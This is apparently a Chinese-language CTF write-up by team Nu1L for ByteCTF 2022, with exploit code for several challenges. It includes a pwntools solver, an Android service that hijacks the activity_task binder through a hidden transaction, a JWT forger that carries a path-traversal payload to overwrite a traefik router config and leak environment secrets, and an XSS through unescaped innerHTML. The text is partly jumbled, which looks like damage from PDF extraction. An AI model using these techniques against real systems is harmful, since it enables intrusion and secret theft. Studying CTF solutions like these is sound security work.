%2F 构造路径穿越, exp 如下
bytedance 2022 Nu1L
Compare
from pwn import * 
import random 
from fractions import Fraction 
from Crypto.Util.number import * 
CHALLENGE_ID = 'c34409b34458e108242ea271d5126481' 
r = remote(CHALLENGE_ID + '.2022.capturetheflag.fun', 1337, 
ssl=True) 
context(log_level='debug') 
MSG = b'MSG//2**512==0' 
r.sendlineafter(b'Hello, Give me your expr: ', MSG) 
for _ in range(100): 
    r.recvuntil(b'n = ') 
    n = int(r.recvline().decode().strip()) 
    r.recvuntil(b'g = ') 
    g = int(r.recvline().decode().strip()) 
    r.recvuntil(b'a = ') 
    a = int(r.recvline().decode().strip()) 
    r.recvuntil(b'b = ') 
    b = int(r.recvline().decode().strip()) 
    inv_b = pow(b, -1, n**2)
    x = a * inv_b % n**2 
    r.sendlineafter(b'msg = ', f'{x}'.encode()) 
r.interactive() 
PYTHON
Silver Droid
离谱题，直接logcat就有IMEI 
ByteCTF{8606351760878824}
service.jar 有个东西 
framework.jar
思路：
用 godGiveMeAddService 覆盖 task_activity 
HTML
Find IMEI
Android MITM
static final int TRANSACTION_godGiveMeAddService = 0xDF; 
case 0xDF:  
parcel2.enforceInterface("android.app.IActivityManager"); 
iActivityManager$Stub0.godGiveMeAddService(data.readString(), 
data.readStrongBinder()); 
reply.writeNoException(); 
JAVA
构造中间人服务
package 
; 
import 
Service; 
import 
Context; 
import 
Intent; 
import 
IBinder; 
import 
RemoteException; 
import 
Log; 
import 
InvocationTargetException; 
public class FakeService extends Service { 
    String TAG = "CTF1"; 
    private IBinder mbinder; 
    private IBinder old_binder; 
    @Override 
    public void onCreate() { 
        super.onCreate(); 
        try { 
            old_binder = 
(IBinder)Class.forName("android.os.ServiceManager").getDeclaredM
ethod("getService", String.class).invoke(null, "activity_task"); 
            mbinder = new ServerBinder(old_binder); 
            IBinder am = 
(IBinder)Class.forName("android.os.ServiceManager").getDeclaredM
ethod("getService", String.class).invoke(null, 
Context.ACTIVITY_SERVICE); 
Parcel data = 
Parcel.obtain(); 
Parcel reply = 
Parcel.obtain(); 
data.writeInterfaceToken("android.app.IActivityManager"); 
            data.writeString("activity_task"); 
JAVA
com.example.attackmitm
android.app.
android.content.
android.content.
android.os.
android.os.
android.util.
java.lang.reflect.
android.os.
android.os.
android.os.
android.os.
1. 搞个远程server跑下面那个python脚本，lec是要写的内容
2. go run main.go跑下面的go 生成jwttoken，注意把地址改成远程server地址，
只能用80端口，\..\最后面就是 
要写入的文件路径
3. 发现route支持sprig，sprig有个env函数
4. 添加一个响应头 把env里的ag打出来
            data.writeStrongBinder(mbinder); 
            try { 
                am.transact(0xDF, data, reply, 0); 
            } catch (RemoteException e) { 
                e.printStackTrace(); 
            } 
            Log.d(TAG, am.toString());
        } catch (IllegalAccessException e) { 
            e.printStackTrace(); 
        } catch (InvocationTargetException e) { 
            e.printStackTrace(); 
        } catch (NoSuchMethodException e) { 
            e.printStackTrace(); 
        } catch (ClassNotFoundException e) { 
            e.printStackTrace(); 
        } 
    } 
    public IBinder onBind(Intent intent) { 
        return mbinder; 
    } 
} 
microservices
package main 
import ( 
"time" 
"web/consts" 
"fmt" 
"github.com/golang-jwt/jwt" 
) 
type TokenClaims struct { 
Username string `json:"username"` 
ImgUrl   string `json:"img_url"` 
jwt.StandardClaims 
} 
var LargeMap = make(map[string]string, 50000) 
const TokenExpireDuration = time.Hour * 24 * 2 
var MySecret = []byte("68D250A037F84EEB8680CB653679CBCA") 
func GenToken(name string, imgUrl string) (string, error) { 
c := TokenClaims{ 
name, 
imgUrl, 
jwt.StandardClaims{ 
ExpiresAt: 
time.Now().Add(TokenExpireDuration).Unix(), 
}, 
} 
token := jwt.NewWithClaims(jwt.SigningMethodHS256, c)
return token.SignedString(MySecret) 
} 
func ParseToken(tokenString string) (*TokenClaims, error) { 
token, err := jwt.ParseWithClaims(tokenString, 
&TokenClaims{}, func(token *jwt.Token) (i interface{}, err 
error) { 
return MySecret, nil 
}) 
if err != nil { 
return nil, consts.InvalidToken 
} 
if claims, ok := token.Claims.(*TokenClaims); ok && 
token.Valid { 
return claims, nil 
} 
return nil, consts.InvalidToken 
} 
func main(){ 
//JWT-TOKEN 
fmt.Println(GenToken("test", 
"http://server/\\..\\..\\..\\..\\..\\..\\..\\..\\opt\\traefik\\r
outer.yml")) 
} 
import argparse 
from http.server import HTTPServer, BaseHTTPRequestHandler 
filec = b'''http: 
  routers: 
    router0: 
      entryPoints: 
      - web 
      service: backend0 
      rule: "PathPrefix(`/api/v1/`) && !Query(`dev=`)" 
    router1: 
      entryPoints: 
      - web 
      service: backend1 
      rule: "PathPrefix(`/debug/`)" 
    router1: 
      entryPoints: 
      - web 
      service: backend3 
      middlewares: 
      - "testHeader" 
      rule: "PathPrefix(`/`)" 
  middlewares: 
    testHeader: 
      headers: 
        customResponseHeaders: 
          X-Custom-Response-Header: {{env "FLAG"}} 
  services: 
    backend0: 
      loadBalancer: 
        servers: 
        - url: http://127.0.0.1:8081/ 
        passHostHeader: false 
    backend1: 
      loadBalancer: 
        servers: 
        - url: http://127.0.0.1:6060/ 
        passHostHeader: false 
    backend3: 
      loadBalancer: 
        servers: 
        - url: https://127.0.0.1:8080 
        passHostHeader: true 
''' 
class S(BaseHTTPRequestHandler): 
    def _set_headers(self): 
        self.send_response(200) 
        self.send_header("Content-type", "text/html") 
        self.end_headers() 
    def do_GET(self): 
        self._set_headers() 
        self.wfile.write(filec) 
def run(server_class=HTTPServer, handler_class=S, 
addr="localhost", port=8000): 
    server_address = (addr, port) 
    httpd = server_class(server_address, handler_class) 
    print(f"Starting httpd server on {addr}:{port}") 
    httpd.serve_forever() 
if __name__ == "__main__": 
    parser = argparse.ArgumentParser(description="Run a simple 
HTTP server") 
    parser.add_argument( 
        "-l", 
        "--listen", 
        default="0.0.0.0", 
        help="Specify the IP address on which the server 
listens", 
    ) 
    parser.add_argument( 
        "-p", 
        "--port", 
        type=int, 
        default=80,
        help="Specify the port on which the server listens", 
    ) 
    args = parser.parse_args() 
    run(addr=args.listen, port=args.port) 
一个xss点
需要游戏通关实现XSS，利用iframe.contentWindow.location.replace不断刷新
hash
最后在name中传入js，打/status，限制只能4字节，最后载env命令的回显中发现
ag
GET /api/v1/student/query?;dev=true HTTP/1.1 
Host: bb76a8ed4adc63ff8531e9fa920bbe14.2022.capturetheflag.fun 
JWT-Token: 生成的jwt 
Connection: close 
typing_game
function gameOver() { 
    if (score >= words.length) { 
        const params = new 
URLSearchParams(window.location.search) 
        const username = params.get('name'); 
        endgameEl.innerHTML = ` 
    ^_^ 
    Dear ${username},Congratulations on your success.Your final 
score is ${score}`; 
    endgameEl.style.display = 'flex'; 
    } else { 
        score=0 
        endgameEl.innerHTML = ` 
    *_* 
    Try again`; 
    endgameEl.style.display = 'flex'; 
    } 
} 
JS
cmd = "env"
cmd = `fetch("http://127.0.0.1:13002/status?